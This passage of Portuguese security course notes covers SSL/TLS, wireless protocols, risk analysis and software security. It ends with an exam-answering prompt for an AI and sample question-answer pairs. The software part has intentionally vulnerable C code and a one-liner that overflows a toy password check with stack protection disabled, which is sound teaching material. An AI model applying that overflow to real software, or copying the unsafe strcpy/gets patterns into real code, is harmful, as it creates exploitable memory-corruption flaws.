  - Alert protocol: Gere as anomalias da ligação, pode desligar a mesma

Fonte: Stallings

## Secure Socket Layer
 20
- Record Protocol:
  - Dados divididos em fragmentos
  - Compressão (SSL 3.0 e TLS 1.0 não usam)
  - Integridade: O protocolo handshake define uma chave partilhada usada no MAC
  - Confidencialidade: Os dados são cifrados com uma chave partilhada definida no handshake

Fonte: Stallings

## Secure Socket Layer
 21

Fonte: VPNsIllustrated

## SSL
 22
- Client_hello: version, random, sessionid, ciphersuite (lista das que suporta), compression
- Server_hello: version, random, sessionid, ciphersuite (escolhe uma), compression

Fonte: Stallings

## SSL
 23
- Certificate: Apresenta o certificado do servidor e a cadeia adicional de certificados da CA para verificar o mesmo
- RSA: chave pública no certificado
- FixedDiffieHellman: Parâmetros no certificado
- Este passo não acontece com anonymousDH
- Server_key_exchange:
  - RSA Sign only: Geração de novas chaves RSA temporárias e envio da pública assinada
  - EphemeralDH (Onetimekey): Parâmetros assinados
  - AnonymousDH
  - Este passo não acontece com RSA (encrypt) e FixedDH

Fonte: Stallings

## SSL
 24
- Certificate_request: Pede o certificado cliente tendo em conta as autoridades suportadas
- Server_hello_done: Indica o fim do server_hello

Fonte: Stallings

## SSL
 25
- Certificate(cliente): Envio do certificado do cliente
- Client_key_exchange:
  - RSA: cliente cifra uma pre-master-secret 47 bytes com chave pública do servidor
  - Anone EphDH: Envia os parâmetros do DH
  - FixedDH: Não acontece porque os parâmetros para o cliente utilizar já foram enviados no certificado do servidor
  - Client_verify: Assinatura do certificado do servidor com a chave privada do certificado cliente

Fonte: Stallings

## SSL
 26
- Change_cipher: Mudar para a cipher suite escolhida
- Calculo da master secret:
- Finished: HMAC de todas as mensagens anteriores do handshake cifradas com a master secret

Fonte: Stallings

## Secure Socket Layer
 27
- Retoma de sessões pode ser feita através do identificador sem repetir todo o processo

Fonte: VPNsIllustrated

## Ataques SSL
 28
- Site dentro de site

Fonte: Stanford

## Ataques SSL
 29
- Mudar o https de um link para http

Fonte: Marlinspike

## Ataques SSL
 30
- Mudar o favicon como cadeado

Fonte: Marlinspike

## Ataques SSL
 31
- Homograph attack: Interpretação de caracteres pelos browsers permite registar sites diferentes

Fonte: CMU

## Ataques SSL
 32
- Comprar um certificado wildcard: *.site.cn
- Os dns de sites chineses suportam /? =
- Criar um dns: [http://www.pnc.co](http://www.pnc.co)m/webapps/unsec/homepage.site.cn

Fonte: Stanford

## Ataques SSL
 33
- Criaram um certificado verdadeiro para ser assinado pela CA
- Forjaram um certificado falso para dar o mesmo Md5 do verdadeiro através de colisões
- A CA assinou o verdadeiro e eles usam a mesma assinatura no falso

Fonte: Sotirov

## Ataques SSL
 34
- Vulnerabilidade de implementação no OpenSSL (HEARTBLEED):

Fonte: XKCN

## Ataques SSL
 35
- Vulnerabilidade de implementação no OpenSSL (HEARTBLEED):

Fonte: XKCN

## SSH
 36
- Secureshell: É mais do que uma shell segura
- Comunicação segura sobre TCP
- Shell remota, cópia de ficheiros
- Versão 1 e 2
  - Versão 1 tem vulnerabilidades

Fonte: SSH Definitive Guide

## SSH
 37
- Pode estabelecer túneis (VPN dos pobres)

Fonte: VPNsIllustrated

## Wired Equivalent Privacy
 38
- WEP:
  - Chaves estáticas partilhadas de 40 ou 104 bits criadas manualmente
  - Garante a integridade com CRC que forma o integrity check value
  - Garante a confidencialidade com RC4
  - Segurança do RC4 depende do vector de inicialização público IV de 24 bits

Fonte: Wireless definitive guide

## Wired Equivalent Privacy
 39
- Problemas:
  - Mensagens podem ser escutadas e repetidas por outros (replay)
  - CRC não é uma algoritmo criptográfico que garanta integridade
  - O vector de inicialização repete-se
    - Fabricantes descuram necessidades de PRNG
    - Atacante pode gerar tráfego para esgotar período
  - Não existe nova distribuição de chaves e chaves não expiram
  - Não existe autenticação mútua

Fonte: VPNsIllustrated

## Temporal Key Integrity Protocol
 40
- TKIP: Utilizado no WPA
- Gestão de chaves: Várias chaves mestras e renegociação de chaves periódica
- Utiliza RC4, mas gera uma chave única para cada frame através da chave mestra (128 bits)
- Utiliza um contador de sequência para prevenir replays
- Message integrity check (MIC): utiliza o algoritmo michael para garantir a integridade (64 bits)
- Garante adicionalmente a integridade do endereço de origem
- Reage a falhas de integridade (existem ataques para o michael)
- Desliga o cliente e renegoceia chaves

Fonte: VPNsIllustrated

## CCMP
 41
- CCMP: Counter Mode with Cipher Block Chaining Message Authentication Code Protocol
- Utilizado no WPA2
- Utiliza o AES (chaves 128, 192 e 256 bits)
- Utiliza as medidas adicionais do TKIP
- contador sequência, renegociação chaves, chaves únicas
- Modo counter garante confidencialidade
- Modo CBC-MAC garante a integridade e autenticidade
- São processados blocos de 128 bits

## Ataques wireless
 42
- Os ataques wireless que afectam o WPA2 são na sua maioria ataques de falhas de implementação pelos fabricantes para simplificar a vida aos utilizadores domésticos
- WPS: utilização de PIN para ligar a rede wireless
  - Ataque de bruteforce
- Gerar a chave de acesso através de elementos do dispositivo
- Através do Mac, SSID com algoritmo secreto (segurança por obscuridade)
- Adicionar elementos extra que facilitam os ataques
  - PMKID

---
### 8. RiscoIT
---
### Gestão de Risco de Sistemas de Informação

## Princípios de Gestão de Risco

* Objectivo da gestão de risco: Controlar e mitigar (minimizar) o risco até um nível aceitável pela gestão de topo
* O risco só pode ser eliminado se houver a extinção da actividade que gera o risco
* Os bens da organização devem ter um valor associado de acordo com o impacto da sua perda no negócio
	+ Estes valores devem ser obtidos através de uma análise de impacto no negócio (BIA: Business Impact Analysis)
* A análise de risco é efectuada para fornecer informação à gestão de topo que possibilite a decisão de como actuar perante o risco
	+ Contém uma análise custo benefício que permite prioritizar as acções de mitigação

## Princípios de Gestão de Risco

* Tratamento de riscos:
	+ Reduzir/mitigar: Implementação de medidas de segurança para mitigar o risco
	+ Aceitar: Aceitação do nível de risco pela gestão de topo tendo a organização fundos para cobrir a perda
	+ Transferir: Contratar um seguro para cobrir a perda ou outsourcing do serviço
	+ Eliminar: Descontinuar a actividade de negócio que é alvo do risco

## Princípios de Gestão de Risco

 Fonte: Whitman 4

* Risco Total (inerente): Risco agregado antes de qualquer medida de segurança para mitigar o risco
* Risco Residual: Risco resultante após aplicação das medidas de segurança
* Risco Residual = Risco Total – Medidas Segurança
* A implementação de medidas de mitigação só se justifica se o seu custo for inferior ao valor do risco a mitigar
* A decisão parte sempre da gestão de topo

## Princípios de Gestão de Risco

 Fonte: Whitman 6

## Análise de Risco Qualitativa

* Análise subjectiva e não quantificada
	+ Risco determinado por escalas
	+ Baseada na elaboração de cenários discutidos entre vários especialistas

Fonte: CISSP All-in-One

## Análise de Risco Quantitativa

* Análise que atribui valores monetários aos riscos
* Asset Value (AV): valor do bem para o negócio
* Exposure Factor (EF): Percentagem de exposição a uma ameaça
* Single Loss Expectancy (SLE): valor de perda numa única concretização de ameaça
* SLE = AV x EF
* Annualized Rate of Ocurrence (ARO): Número de vezes que a ameaça acontece por ano (histórico)
* Annualized Loss Expectancy (ALE): valor de perda por ano
* ALE = SLE x ARO

## Análise de Risco Quantitativa

* Análise custo/benefício:
	+ Return on Security Investment (ROSI):
		- ROSI (simplified) = (ALE antes do controlo) – (ALE após o controlo) – (custo anual do controlo)
	+ Net Present Value (NPV): Diferença entre benefícios e custo do projeto
		- Só se avança se o NPV for positivo
		- Adequado a investimentos incrementais
	+ Internal Rate of Return (IRR): Comparação de retorno de investimento
		- Comparação de vários investimentos em busca da maior IRR
		- Coloca o NPV a 0

Fonte: CISSP All-in-One

## Qualitativa VS Quantitativa

Fonte: Cissp Study Guide

## Avaliação de Risco

### 1) Caracterização dos sistemas / activos (assets)

* Validação do âmbito tendo em conta os sistemas a analisar
* Obtenção de informação
	+ Questionários, entrevistas, ferramentas automáticas de inventário, documentação
* Dependências entre os sistemas
* Requisitos funcionais, utilizadores tipo, arquitectura dos sistemas
* Controlos operacionais existentes
* Fluxos de informação

## Avaliação de Risco

### 2) Identificação das ameaças

* Identificação de fontes de ameaças naturais, humanas ou ambientais
* As ameaças humanas podem ser intencionais (ataque deliberado) ou não intencionais (erros ou negligência)
* Análise da motivação da ameaça

Fonte: Whitman

## Avaliação de Risco

### 2) Identificação das ameaças

Fonte: Peltier

## Avaliação de Risco

### 3) Identificação das vulnerabilidades

* Testes de segurança / intrusão
* Auditorias periódicas
* Lista de vulnerabilidades com ameaças
* Avaliação de requisitos de segurança
* Checklists de verificação de configurações de segurança
* Fontes de informação: listas vulnerabilidades, avisos fabricantes, auditorias anteriores

## Avaliação de Risco

### 4) Análise de controlos existentes

* Enumeração dos controlos técnicos e não técnicos
* Determinação da categoria de actuação do controlo
* Lista dos controlos actuais e planeados para mitigação do risco

Fonte: Peltier

## Avaliação de Risco

### 5) Determinação da probabilidade de ocorrência

* Devem ser analisados os seguintes factores:
	+ Motivações e capacidades do atacante
	+ Natureza da vulnerabilidade
	+ Existência e efectividades dos controlos implementados
* Fontes de informação para determinar taxas de ocorrência (ARO): Relatórios resposta incidentes, entidades de segurança, protecção civil

## Avaliação de Risco

### 6) Análise de Impacto

* Uma análise de impacto no negócio (BIA) deve ter em conta os seguintes factores:
* Missão do sistema (processos negócio envolvidos)
* Criticidade do sistema e dados (valor para o negócio)
* Sensitividade do sistema e dados
* Identifica e define prioridades para os sistemas de informação críticos de acordo com a sua importância para o negócio

## Avaliação de Risco

### 7) Determinação do risco

* Análise da probabilidade de uma ameaça explorar uma vulnerabilidade
* Análise da magnitude do impacto se a ameaça for bem sucedida na exploração da vulnerabilidade
* Análise da adequação dos controlos existentes e planeados na mitigação de risco
* Medição do risco através de uma escala ou quantificação numérica
* Elaboração de uma matriz de risco com probabilidade de ocorrência e impacto

Fonte: NIST

## Avaliação de Risco

### Matriz Risco: Probabilidade X Impacto

Fonte: NIST

## Avaliação de Risco

### 8) Recomendação de controlos

* Durante o processo são detectadas oportunidades adicionais de mitigação de risco com novos controlos que devem servir de input à análise contínua de risco
* Para recomendar controlos devem ser equacionados os seguintes factores:
	+ Efectividade da opção de controlo
	+ Legislação, regulamentação do sector
	+ Política organizacional
	+ Impacto operacional
	+ Confiabilidade
* Deve existir uma análise custo benefício na escolha de controlos tendo em conta o seu custo e qual o valor de mitigação de risco

## Avaliação de Risco

### 9) Documentação dos resultados

* Relatório detalhado da avaliação de risco contendo as ameaças, vulnerabilidades, medição de risco e medidas de controlo a implementar
* Relatório dirigido à gestão de topo para a tomada de decisões
* Pode detalhar um roadmap de acções com prioridades e esforço

## ISO 31000

 25

* Norma que documenta as boas práticas da gestão de risco
* Processo com as fases:

Fonte: ISO 31000

## ISO 31000

 Fonte: ISO 31000 26

* Permite a criação de uma framework de risco:

## ISO 27005

 Fonte: ISO 27005 27

* ISO 27005: Adopta o ciclo da ISO 31000
* Identifica os pontos de decisão

## ISO 27005

 Fonte: ISO 27005 28

* As fases segundo o PDCA:
	+ Alinhamento com ISMS

---
### 9. Softsec
---
### Segurança Software

- Motivação: Software presente no dia a dia
    - Vulnerabilidades não param de crescer
    - Pressão time to market deixa segurança em segundo plano
    - Aumento de complexidade
    - Conectividade: tudo está ligado entre si e aumento de dependências
        - Proliferação de sistemas distribuídos
    - Software é cada vez mais extensível:
        - EX: Mobile, bibliotecas partilhadas

## Introdução

- Sistema operativo deve proteger acesso de

### sujeitos a objectos

- Sujeitos: utilizadores, processos
- Objectos: disco, memória, I/O
- Separação entre modos: user, kernel
- Acesso a instruções privilegiadas em modo kernel através de interrupções
- Interrupções por software: traps
- Protecção da memória: um processo não pode

### aceder de forma não autorizada à memória

## Segurança SO

- Protecção de memória: Garantir a separação

### lógica da memória entre processos

- Separação física
- Separação lógica: os processos não tem visibilidade entre eles
    - Paginação, Segmentação
- Separação temporal: processos correm em contextos temporais diferentes
- Separação criptográfica: garantir que a informação não é perceptível por elementos não autorizados

## Segurança SO

- Protecção de memória: memória

### alocada a um processo

### particionada em segmentos

- `.text`: código do programa
- `.data`: dados estáticos inicializados
- `.bss`: dados estáticos não inicializados
- `.stack`: pilha que cresce para endereços mais baixos
- `.heap`: cresce para endereços mais altos

## Segurança SO

```
Fonte: ucbs.edu
```

- Buffer overflow: são colocados mais dados do

#### que tamanho do buffer suporta

- Também designado buffer overrun
- Afecta a estabilidade do programa ou crash
- Afecta linguagens que não verificam se o limite

#### do buffer é violado: C, C++

- Um atacante pode tentar sobrepor dados aos

#### quais não deveria ter acesso alterando a

#### execução do programa

- Ex: sobrepor a variável que identifica o admin
- Existem funções comuns conhecidas pela sua má

#### gestão de buffers:

- `gets()`, `strcpy()`, `sprintf()`, `scanf()`

## Buffer overflow

- Stack overflow: Uma função copia uma string

### de input num buffer

## Buffer overflow

 7

- Suppose Web server contains this func `void func(char *str) {` `char buf[126];` `strcpy(buf,str);` `}`

```
Fonte: utexas.edu
```

- Stack overflow: Se forem passados mais de

### 126 caracteres o endereço de retorno é

### sobreposto

## Buffer overflow

 8

- Suppose Web server contains this func `void func(char *str) {` `char buf[126];` `strcpy(buf,str);` `}`

```
Fonte: utexas.edu
```

- Stack overflow: Existem múltiplas soluções

### para este tipo de vulnerabilidade

- Validar o tamanho com um `if` antes de copiar:
    ```c
    if(strlen(src) >= dst_size) {
        /* throw an error */
    } else {
        strcpy(dst, src);
    }
    ```
- Utilizar a função `strncpy`:
    ```c
    strncpy(dst, src, dst_size-1);
    dst[dst_size-1] = '\0';
    ```

## Buffer overflow

Programa exemplo vulnerável:

```c
#include <string.h>
void foo(char *str) {
    char buffer[12];
    strcpy(buffer, str);
}

int main() {
    char *str = "This is definitely longer than 12";
    foo(str);
    return 1;
}
```

## Buffer overflow

Programa exemplo vulnerável bufferwin:

```c
#include <string.h>
#define goodPass "GOODPASS"

int main() {
    char passIsGood = 0;
    char buf[80];
    printf("Enter password: \n");
    gets(buf);
    if (strcmp(buf, goodPass) == 0)
        passIsGood = 1;
    if (passIsGood == 1)
        printf("You win! \n");
}
```

## Buffer overflow

Programa exemplo vulnerável bufferwin:

- Desligar stack protection:
    ```sh
    gcc -o bufferwin bufferwin.c -fno-stack-protector
    ```
- Executar:
    ```sh
    python -c 'print "x"*80 + "\x01"' | ./bufferwin
    ```

## Buffer overflow

- Heap overflow:
    - Heap: memória alocada dinamicamente
        - Ex: `malloc()`
        - Contém apontadores para ficheiros, variáveis e funções temporárias
    - Objectivo do ataque: redireccionar o apontador para algo útil ao atacante

## Buffer overflow

 Fonte: tamu.edu 13

- Heap overflow:

## Buffer overflow

- Off-by-one: permite o overflow de 1 byte
    - Erros comuns:
        - Esquecer a terminação da string `\0`
        - Um índice de um array começa em 0
        - Trocar um sinal de `=` com um sinal de `<=`
    - Não é de fácil exploração mas pode permitir rescrever o valor de uma variável ou alterar um apontador

## Buffer overflow

```
Fonte: ucbs.edu
```

- Integer overflow: ocorre quando não são

### validadas as condições de uma operação

### sobre inteiros

- Overflow: o resultado da operação é maior que o valor máximo permitido de um inteiro
- Underflow: o resultado da operação é menor que o valor mínimo permitido de um inteiro
- Erro de sinal: quando um inteiro com sinal é interpretado como um inteiro sem sinal
- Truncation: uma variável inteira de 16 bits recebe o valor de uma variável de 32 bits

## Buffer overflow

- Representação de inteiros:

## Buffer overflow

```
signed char
```
- -128 0 127

```
0 255
```
```
unsigned char
```
```
0 32767
```
```
short
```
- -32768

```
0 65535
```
```
unsigned short
```
```
signed char
```
- -128 0 127

```
0 255
```
```
unsigned char
```
```
0 32767
```
```
short
```
- -32768

```
0 65535
```
```
unsigned short
```
```
Fonte: pitt.edu
```

- Integer overflow:

## Buffer overflow

```
Fonte: FCUL
```

- Integer underflow:

## Buffer overflow

```
Fonte: FCUL
```

- Erro de sinal:
    - Bit mais significativo caracteriza o sinal

## Buffer overflow

```
Fonte: FCUL
```

- Integer overflow truncation:

## Buffer overflow

```
Fonte: FCUL
```

- Defesas contra buffer overflows:
    - Na compilação:
        - Canaries
        - Return address defender
    - Na execução:
        - Pilha não executável
        - Libsafe
        - ASLR

## Buffer overflow

- Canaries: Forma de defesa contra buffer

### overflows

- Colocar um canário na pilha e verificar a integridade do mesmo antes de retornar da função
- Ex: StackGuard, Propolice, Vstudio /GS

## Buffer overflow

- Canário aleatório: string random escolhida na

### inicialização do programa

- Atacante não consegue adivinhar qual é
- Insere canários em cada frame da pilha e verifica-os no retorno da função
- Canário terminador: coloca um canário com

### um caracter terminador como `\0`, newline,

### linefeed, EOF

- Strings não são copiadas para além do terminador

## Buffer overflow

- Libsafe: biblioteca carregada dinamicamente

### que intercepta as chamadas a funções

### vulneráveis

- Ex. `strcpy(dest, src)`
- Verifica o espaço disponível em relação ao espaço necessário
- Se existir alguma anomalia termina a aplicação
- Funções de libsafe funcionam como wrappers das funções vulneráveis

## Buffer overflow

- Pointguard:
    - Ataque: um overflow pode rescrever um apontador
    - Defesa: cifrar os apontadores na memória com uma chave random na inicialização do programa
    - Cada apontador é XOR com a chave na memória e XOR quando é movido para os registos do CPU
    - O atacante não consegue prever a chave e se subscrever o apontador, ele vai apontar para outro sítio sem utilidade na memória
    - Desvantagem: overhead significativo

## Buffer overflow

- Pointguard:

## Buffer overflow

 Fonte: Shmatikov 27

- Memória não executável: É possível restringir

### segmentos da memória para apenas execução

### ou apenas escrita (“W xor X”)

- Possível marcar a pilha ou heap de não executável através do NX bit na entrada de página
    - NX-bit no AMD Athlon64, XD-bit no Intel P4 Prescott
- Implementações

---
### perguntas_formated
---

```

Para responder a esta pergunta:
1. Leia e compreenda cuidadosamente a pergunta.
2. Procure no conteúdo markdown informações relevantes.
3. Formule uma resposta precisa e direta com base exclusivamente nas informações encontradas no conteúdo markdown.
4. Tenha como objetivo uma resposta concisa que aborde completamente a pergunta sem omitir detalhes cruciais.
5. Concentre-se apenas no ponto central da pergunta, evitando informações tangenciais.
6. Forneça uma resposta que seria adequada para uma resposta de teste - clara, precisa e directa ao ponto.

Apresente a sua resposta no seguinte formato:

```markdown
**Resposta:**
A sua resposta concisa e precisa para a pergunta do utilizador, baseada exclusivamente no conteúdo markdown fornecido.
```

Lembre-se, a brevidade é valorizada, mas não à custa de informações cruciais. Forneça uma resposta focada que aborde diretamente a pergunta do utilizador, usando apenas as informações disponíveis no conteúdo markdown fornecido.

Deve sempre apresentar respostas extremamente precisas em português europeu (PT-pt). É essencial que todas as suas respostas usem vocabulário, ortografia, expressões idiomáticas e construções frasais típicas de Portugal. Por favor, evite termos e estruturas que sejam específicos do português brasileiro, angolano ou de outros países lusófonos. A sua precisão linguística é crucial para garantir a relevância e a adequação ao contexto de Portugal.

Importante: Não refira que está especificamente treinado para falar português de Portugal, a menos que seja questionado diretamente sobre isso. Considere a utilização do português europeu como uma parte inerente ao contexto.

### Instruções adicionais:
- Utilize "computador" ou "máquina" em vez de "PC".
- Use "password" em vez de "senha".
- Use "procura" em vez de "busca".
- Prefira "telemóvel" a "celular".
- Use "autocarro" em vez de "ônibus".
- Utilize "peão" em vez de "pedestre".
- Prefira "câmara municipal" a "prefeitura".
- Utilize "sandes" em vez de "sanduíche".
- Prefira "elevador" a "ascensor".
- Prefira "cão" em vez de "cachorro".
- Evite o uso de gírias e expressões que não sejam comuns em Portugal.
- Assegure-se de que a ortografia siga o Acordo Ortográfico ratificado em Portugal em 2008.

A sua atenção aos detalhes culturais e linguísticos é fundamental para o sucesso desta tarefa.

### Perguntas exemplo
Respostas desta interação servem para exemplificar  para ideias de como respoder as perguntas que também tem a mesma fonte base no conteudo em markdown em cima quotado. Anotação de perguntas em aula que servem como guia para as perguntas que vamos ter. 

```json
[
  {
    "pergunta": "Diga o que entende por integridade da informação?",
    "resposta": "Integridade da informação refere-se à garantia de que a informação não é alterada ou destruída de maneira não autorizada. Isso inclui proteger a precisão e a completude da informação ao longo de todo o seu ciclo de vida. A integridade assegura que as modificações na informação só sejam feitas por pessoas ou processos autorizados e que tais modificações sejam rastreáveis."
  },
  {
    "pergunta": "Explique quatro tipos diferentes de controlos de segurança e dê um exemplo para cada um deles.",
    "resposta": "1. Dissuasão: O objetivo é dissuadir os atacantes, por exemplo, através de penas legais severas ou medidas preventivas visíveis, como câmeras de vigilância. \n2. Prevenção: Implementar mecanismos que evitem falhas de segurança, tais como firewalls e sistemas de prevenção de intrusões. \n3. Detecção: Identificar falhas de segurança através de sistemas de detecção de intrusões (IDS) ou de monitoramento de logs.\n4. Correção: Tolerar ou corrigir falhas de segurança após sua detecção, como aplicar patches de software ou restaurar backups."
  },
  {
    "pergunta": "Enumere e explique 4 Princípios da proteção da informação segundo Saltzer e Schroeder.",
    "resposta": "1. Privilégio Mínimo: Conceder apenas os privilégios necessários para que uma tarefa ou função seja realizada, minimizando os riscos de abuso. \n2. Predefinições Seguras (Fail-Safe): Configurar sistemas para falhar de forma segura, negando acesso por omissão. \n3. Economia de Mecanismo: Manter a simplicidade nos mecanismos de segurança, facilitando sua compreensão e teste, reduzindo a probabilidade de erros. \n4. Mediação Completa: Garantir que todos os acessos aos recursos sejam autorizados, evitando o uso de cache de credenciais que poderia ser explorado por atacantes."
  },
  {
    "pergunta": "Descreva e compare criptografia simétrica de bloco com criptografia simétrica de fita (stream).",
    "resposta": "A criptografia simétrica de bloco cifra grupos de caracteres (blocos) de tamanho fixo de uma vez. Tem alta difusão e imunidade a inserções, mas é mais lenta e sofre de propagação de erros. A criptografia de fita (stream) cifra caracteres individualmente, é rápida e tem uma baixa propagação de erros, mas é mais vulnerável a inserções e eliminações maliciosas. A criptografia de bloco é mais adequada para software, enquanto a stream é mais voltada para hardware."
  },
  {
    "pergunta": "Descreva e compare criptografia simétrica com criptografia assimétrica.",
    "resposta": "A criptografia simétrica utiliza uma única chave para cifrar e decifrar os dados, sendo rápida e adequada para grandes volumes de dados, porém requer que a chave seja compartilhada em segurança. A criptografia assimétrica utiliza um par de chaves - uma pública e uma privada - onde uma chave cifra os dados e a outra os decifra. É mais lenta, mas oferece melhor segurança e é geralmente usada para troca de chaves e assinaturas digitais."
  },
  {
    "pergunta": "Compare o algoritmo DES com o algoritmo AES.",
    "resposta": "O DES (Data Encryption Standard) foi desenvolvido pela IBM em 1972 e se tornou um padrão US em 1976. Usa uma chave de 56 bits e cifra blocos de 64 bits através de transposição e substituição. É vulnerável a ataques de força bruta devido ao tamanho reduzido da chave. O AES (Advanced Encryption Standard) foi escolhido em um concurso pelo NIST em 2000. Usa chaves de 128, 192 ou 256 bits e cifra blocos de 128 bits. Oferece maior segurança e eficiência em comparação com o DES."
  },
  {
    "pergunta": "Explique o processo de envio de uma mensagem usando criptografia assimétrica com o objetivo de garantir a confidencialidade da informação.",
    "resposta": "Para enviar uma mensagem com criptografia assimétrica garantindo a confidencialidade, o remetente primeiro cifra a mensagem com a chave pública do destinatário. Este processo assegura que apenas o destinatário, que possui a chave privada correspondente, poderá decifrar a mensagem. Assim, mesmo que a mensagem seja interceptada durante a transmissão, apenas o destinatário poderá lê-la."
  },
  {
    "pergunta": "Explique o que se entende por MD5.",
    "resposta": "MD5, desenvolvido por Ronald Rivest em 1991, é um algoritmo de hash que gera um resumo fixo de 128 bits a partir de um bloco de dados de 512 bits. Embora amplamente utilizado no passado, é vulnerável a ataques de colisão, onde duas mensagens diferentes podem produzir o mesmo hash. Devido a essas vulnerabilidades, MD5 não é recomendado para aplicações de segurança atuais."
  },
  {
    "pergunta": "Explique o processo de assinatura digital de uma mensagem e o processo de verificação da assinatura.",
    "resposta": "Uma assinatura digital envolve usar a chave privada do remetente para cifrar o hash da mensagem. O destinatário, ao receber a mensagem e a assinatura, usa a chave pública do remetente para decifrar a assinatura e obter o hash original. Em seguida, o destinatário gera um hash da mensagem recebida e compara com o hash decifrado. Se ambos coincidem, a integridade e a autenticidade da mensagem são confirmadas."
  },
  {
    "pergunta": "O que entende por sistemas AAA?",
    "resposta": "AAA refere-se a Autenticação, Autorização e 'Accounting'. Autenticação é provar a identidade de um usuário. Autorização é determinar quais recursos o usuário tem permissão para acessar após ser autenticado. 'Accounting' envolve rastrear o uso de recursos pelo usuário, possibilitando auditorias e monitoramento de atividades."
  },
  {
    "pergunta": "Explique três factores de autenticação e dê um exemplo para cada um deles.",
    "resposta": "1. Algo que se sabe: um conhecimento secreto, como uma password ou PIN. \n2. Algo que se tem: um objeto físico, como um smartcard ou token de segurança. \n3. Algo que se é: características biométricas, como impressões digitais ou reconhecimento facial."
  },
  {
    "pergunta": "Na sua opinião, qual política de controlo de acesso é mais frequentemente encontrada nas organizações? Justifique a resposta.",
    "resposta": "O Controlo de Acesso Baseado em Funções (RBAC) é o mais frequentemente encontrado nas organizações. Ele é escalável, facilita a gestão de permissões, permite a definição de perfis de função com responsabilidades e permissões sobrepostas e simplifica o gerenciamento através da aplicação de políticas a grupo e herança hierárquica de direitos."
  },
  {
    "pergunta": "Descreva um ataque que pode ser realizado para descobrir uma password.",
    "resposta": "Um ataque de força bruta envolve tentar todas as combinações possíveis de senhas até encontrar a correta. Este método é demorado e computacionalmente caro, mas garante eventualmente quebrar a senha se houver tempo e recursos suficientes."
  },
  {
    "pergunta": "Se o objetivo for filtrar conteúdo web (HTTP), que tipo de firewall utilizaria? Justifique.",
    "resposta": "Um proxy firewall seria a escolha adequada para filtrar conteúdo web (HTTP). Ele pode analisar o conteúdo das solicitações e respostas HTTP, aplicar políticas específicas com base no conteúdo, fornecer autenticação adicional e fazer caching de conteúdo estático para melhorar o desempenho."
  },
  {
    "pergunta": "Compare host IDS com network IDS.",
    "resposta": "Um Host IDS (HIDS) analisa logs, configurações, e atividades de um único host. É capaz de analisar tráfego cifrado porque reside no host onde é decifrado. Um Network IDS (NIDS) monitora o tráfego de rede capturando pacotes de vários destinos. Ele não pode analisar tráfego cifrado e geralmente vê apenas os ataques, não podendo confirmar se a intrusão teve sucesso."
  },
  {
    "pergunta": "Explique o que entende por Honeypot.",
    "resposta": "Um honeypot é um sistema isca monitorizado, configurado exclusivamente para ser atacado. Ele não tem tráfego legítimo esperável, o que minimiza falsos positivos. Honeypots ajudam a entender as táticas dos atacantes, a avaliar as ameaças reais e a melhorar a segurança geral observando os métodos de invasão usados contra ele."
  },
  {
    "pergunta": "Descreva a vulnerabilidade presente no seguinte código:\n```c\nvoid func(char *str) {\n    char buf[126];\n    strcpy(buf, str);\n}\n```",
    "resposta": "O código está vulnerável a um ataque de buffer overflow. Se a string passada para a função `func` tiver mais de 126 caracteres, ela irá sobrescrever a memória adjacente, o que pode causar erros no programa ou permitir a execução de código arbitrário malicioso."
  },
  {
    "pergunta": "Descreva a vulnerabilidade presente no seguinte código:\n```c\nint main(int argc, char *argv[]) {\n    FILE *fd;\n    if (access(\"/some_file\", W_OK) == 0) {\n        printf(\"access granted.\\n\");\n        fd = fopen(\"/some_file\", \"wb+\");\n        /* write to the file */\n        fclose(fd);\n    } else {\n        err(1, \"ERROR\");\n    }\n    return 0;\n}\n```",
    "resposta": "Este código está vulnerável a uma condição de corrida (race condition) chamada Time of Check to Time of Use (TOCTOU). Ha um potencial para que o arquivo '/some_file' seja substituído por um arquivo simbólico (link) apontando para outro arquivo crítico entre a verificação de acesso e a abertura do arquivo, permitindo que o atacante modifique um arquivo sensível."
  },
  {
    "pergunta": "Descreva o funcionamento de um ataque SQL injection.",
    "resposta": "SQL injection envolve inserir ou 'injetar' código SQL malicioso em uma consulta SQL através de uma entrada de dados não higienizada da aplicação. Se a entrada não for devidamente validada ou escapada, o código injetado pode manipular e executar comandos no banco de dados backend, permitindo extração, modificação ou destruição de dados."
  },
  {
    "pergunta": "Compare o funcionamento de um ataque XSS refletido com um ataque XSS persistente.",
    "resposta": "Em um ataque XSS refletido, o código malicioso é inserido em uma solicitação HTTP e refletido de volta pelo servidor, executando no navegador da vítima imediatamente. Já em um ataque XSS persistente, o código malicioso é armazenado permanentemente no servidor (por exemplo, em um banco de dados) e é servido aos usuários como parte de uma página, executando sempre que alguém acessa a página afetada."
  },
  {
    "pergunta": "Descreva uma forma de proteção contra ataques CSRF.",
    "resposta": "Uma forma eficaz de proteção contra ataques CSRF é usar tokens de validação. Um token CSRF é um valor exclusivo e aleatório gerado pelo servidor que deve acompanhar cada solicitação que modifica dados. Como o atacante não pode obter ou prever este token, ele não consegue realizar uma ação CSRF em nome do usuário."
  },
  {
    "pergunta": "Qual é o principal objetivo de uma gestão de risco?",
    "resposta": "O principal objetivo da gestão de risco é identificar, avaliar e controlar riscos para minimizar seu impacto sobre a organização até um nível aceitável pela gestão de topo. Isso inclui a implantação de medidas de segurança para prevenir, detectar, responder e recuperar-se de eventos adversos com eficácia."
  },
  {
    "pergunta": "Enumere e descreva os métodos de tratamento de risco.",
    "resposta": "1. Reduzir/mitigar: Implementar medidas de segurança para diminuir a probabilidade ou o impacto do risco. \n2. Aceitar: Concordar em assumir o risco, com a preparação para arcar com os custos caso o risco se materialize. \n3. Transferir: Mover o risco para outra entidade, como através de seguros ou terceirização. \n4. Eliminar: Encerrar a atividade ou processo que gera o risco, eliminando-o completamente."
  },
  {
    "pergunta": "Compare a análise de risco qualitativa com a quantitativa.",
    "resposta": "Análise qualitativa de risco é subjetiva e envolve a avaliação de riscos em termos de probabilidade e impacto em escalas não numéricas, muitas vezes através de discussão e concordância de especialistas. A análise quantitativa de risco utiliza dados numéricos e técnicas estatísticas para calcular o impacto financeiro do risco, proporcionando uma medida objetiva do risco através de cálculos como AV (Asset Value), EF (Exposure Factor), SLE (Single Loss Expectancy), ARO (Annualized Rate of Occurrence) e ALE (Annualized Loss Expectancy)."
  },
  {
    "pergunta": "Descreva o que entende por RTO e RPO.",
    "resposta": "RTO (Recovery Time Objective) é o tempo máximo tolerável para restaurar um sistema ou serviço após uma falha antes que ocorra um impacto significativo nos negócios. RPO (Recovery Point Objective) refere-se ao ponto no tempo até qual os dados devem ser recuperados para aceitar a perda de dados após uma interrupção, representando a quantidade máxima de dados que pode ser perdida."
  },
  {
